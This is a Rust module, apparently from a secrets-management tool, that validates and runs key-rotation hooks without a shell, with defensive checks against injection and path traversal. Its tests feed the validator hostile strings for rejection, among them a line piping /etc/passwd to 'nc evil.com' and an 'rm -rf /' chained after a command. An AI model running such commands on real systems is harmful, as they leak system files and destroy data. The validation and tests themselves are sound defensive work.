use std::io::Write;
use std::process::{Command, Stdio};

use crate::error::{Result, SigynError};

#[derive(Debug)]
pub struct HookResult {
    pub hook: String,
    pub success: bool,
    pub output: String,
}

/// Shell metacharacters that indicate potential injection attempts.
const SHELL_METACHARACTERS: &[char] = &[';', '|', '&', '$', '`', '\\', '>', '<', '(', ')'];

/// Maximum allowed hook command length.
const MAX_HOOK_LEN: usize = 512;

/// Validate a hook command string. Should be called when hooks are saved to policy.
///
/// Rejects:
/// - Shell metacharacters (prevents injection when split on whitespace)
/// - Path traversal in the command name
/// - Excessively long commands
pub fn validate_hook(hook: &str) -> Result<()> {
    if hook.is_empty() {
        return Err(SigynError::PolicyViolation(
            "hook command cannot be empty".into(),
        ));
    }
    if hook.len() > MAX_HOOK_LEN {
        return Err(SigynError::PolicyViolation(format!(
            "hook command exceeds {} character limit",
            MAX_HOOK_LEN
        )));
    }
    for ch in SHELL_METACHARACTERS {
        if hook.contains(*ch) {
            return Err(SigynError::PolicyViolation(format!(
                "hook command contains disallowed shell metacharacter: '{}'",
                ch
            )));
        }
    }
    // First token must not contain path traversal
    let first_token = hook.split_whitespace().next().unwrap_or("");
    if first_token.contains("..") {
        return Err(SigynError::PolicyViolation(
            "hook command name contains path traversal (..)".into(),
        ));
    }
    Ok(())
}

/// Execute rotation hooks by directly spawning processes (no shell).
/// Secret key is passed via stdin pipe instead of environment variable
/// to avoid `/proc/<pid>/environ` visibility.
pub fn execute_rotation_hooks(
    hooks: &[String],
    key: &str,
    env_name: &str,
) -> Result<Vec<HookResult>> {
    let mut results = Vec::new();

    for hook in hooks {
        let parts: Vec<&str> = hook.split_whitespace().collect();
        if parts.is_empty() {
            results.push(HookResult {
                hook: hook.clone(),
                success: false,
                output: "empty hook command".into(),
            });
            continue;
        }

        let mut cmd = Command::new(parts[0]);
        cmd.args(&parts[1..]);
        // Pass env name as env var (non-secret), but NOT the key
        cmd.env("SIGYN_ENV", env_name);
        // Pass key via stdin to avoid /proc visibility
        cmd.stdin(Stdio::piped());
        cmd.stdout(Stdio::piped());
        cmd.stderr(Stdio::piped());

        let mut child = cmd
            .spawn()
            .map_err(|e| SigynError::RotationFailed(key.into(), e.to_string()))?;

        // Write key to stdin and close it
        if let Some(mut stdin) = child.stdin.take() {
            let _ = stdin.write_all(key.as_bytes());
            // stdin is closed on drop
        }

        let output = child
            .wait_with_output()
            .map_err(|e| SigynError::RotationFailed(key.into(), e.to_string()))?;

        results.push(HookResult {
            hook: hook.clone(),
            success: output.status.success(),
            output: String::from_utf8_lossy(&output.stdout).to_string(),
        });
    }

    Ok(results)
}

/// Execute a single hook with environment variables (for non-secret hooks).
/// Uses direct execution instead of `sh -c`.
pub fn execute_single_hook(hook: &str, env_vars: &[(&str, &str)]) -> Result<bool> {
    let parts: Vec<&str> = hook.split_whitespace().collect();
    if parts.is_empty() {
        return Ok(false);
    }

    let mut cmd = Command::new(parts[0]);
    cmd.args(&parts[1..]);
    for (k, v) in env_vars {
        cmd.env(k, v);
    }
    let status = cmd
        .status()
        .map_err(|e| SigynError::RotationFailed("hook".into(), e.to_string()))?;
    Ok(status.success())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_validate_hook_valid() {
        assert!(validate_hook("curl -X POST https://example.com/rotate").is_ok());
        assert!(validate_hook("/usr/bin/notify-service").is_ok());
        assert!(validate_hook("echo hello").is_ok());
    }

    #[test]
    fn test_validate_hook_rejects_metacharacters() {
        assert!(validate_hook("curl http://example.com; rm -rf /").is_err());
        assert!(validate_hook("echo $HOME").is_err());
        assert!(validate_hook("cat /etc/passwd | nc evil.com 1234").is_err());
        assert!(validate_hook("cmd > /tmp/output").is_err());
        assert!(validate_hook("cmd `whoami`").is_err());
        assert!(validate_hook("cmd && evil").is_err());
    }

    #[test]
    fn test_validate_hook_rejects_path_traversal() {
        assert!(validate_hook("../../evil-binary").is_err());
        assert!(validate_hook("../hack").is_err());
    }

    #[test]
    fn test_validate_hook_rejects_empty() {
        assert!(validate_hook("").is_err());
    }

    #[test]
    fn test_validate_hook_rejects_too_long() {
        let long = "a".repeat(MAX_HOOK_LEN + 1);
        assert!(validate_hook(&long).is_err());
    }

    #[test]
    fn test_execute_rotation_hooks_stdin() {
        // Use 'cat' to read key from stdin and verify it's passed correctly
        let hooks = vec!["cat".to_string()];
        let results = execute_rotation_hooks(&hooks, "TEST_KEY", "dev").unwrap();

        assert_eq!(results.len(), 1);
        assert!(results[0].success);
        assert_eq!(results[0].output.trim(), "TEST_KEY");
    }

    #[test]
    fn test_execute_single_hook_with_env() {
        let env_vars = [("FOO", "BAR"), ("BAZ", "QUX")];
        let result = execute_single_hook("test BAR = BAR", &env_vars).unwrap();
        // `test BAR = BAR` evaluates the literal strings, always true
        assert!(result);
    }
}
